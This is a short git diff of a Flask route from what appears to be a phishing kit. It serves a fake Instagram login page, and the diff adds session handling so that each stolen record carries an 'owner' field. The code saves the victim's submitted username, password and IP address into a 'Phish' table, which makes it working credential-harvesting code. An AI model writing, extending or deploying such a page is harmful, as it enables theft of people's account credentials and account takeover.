@@ -1,15 +1,17 @@
 from app import db, app
-from flask import render_template, request
-
+from flask import render_template, request, session
+from flask_jwt_extended import jwt_required, get_current_user
 from app.main.config.models import Phish
 
 @app.route('/instagram/login', methods=['GET', 'POST'])
 def ig_login():
+    current_user = get_current_user()
     if request.method == 'GET':
         return render_template('ig_login.html')
     elif request.method == 'POST':
         data = request.form.to_dict()
         user_phished = Phish(platform='Instagram',
+                             owner=session["curr"],
                              phised_user=data["username"],
                              phished_pword=data["password"],
                              ip=request.remote_addr)
